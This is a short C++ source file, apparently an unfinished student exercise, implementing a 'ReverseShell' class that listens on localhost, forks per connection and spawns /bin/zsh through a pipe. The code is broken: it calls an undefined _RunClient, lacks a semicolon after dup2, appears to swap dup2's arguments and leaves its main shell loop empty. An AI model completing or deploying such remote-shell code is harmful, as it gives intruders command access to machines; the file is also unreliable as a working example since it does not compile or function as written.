#include "ReverseShell.hpp"
#include <unistd.h>

#define INPUT	0
#define OUTPUT	1

ReverseShell::ReverseShell(void)
{
	Connection		c("127.0.0.1");

	while (42)
	{
		c.Listen();
		if (fork() == 0)
			_RunClient(c.Accept());
	}
}

ReverseShell::~ReverseShell(void)
{
	std::cout << "Destructor of ReverseShell called" << std::endl;
}

void		ReverseShell::_RunShell(int serverSocket) noexcept
{
	char	cmd[0xF00];
	pid_t	shellPid;
	int		shellIn[2];

	pipe(shellIn);

	if (fork() == 0)
	{
		close(shellIn[OUTPUT]);
		dup2(0, shellIn[INPUT])
		exit(execl("/bin/zsh", "zsh", NULL));
	}

	close(shellIn[INPUT]);

	while (42)
	{
		
	}
}

std::ostream &	operator<<(std::ostream & o, ReverseShell const & r)
{
	o << "tostring of the class" << std::endl;
	(void)r;
	return (o);
}
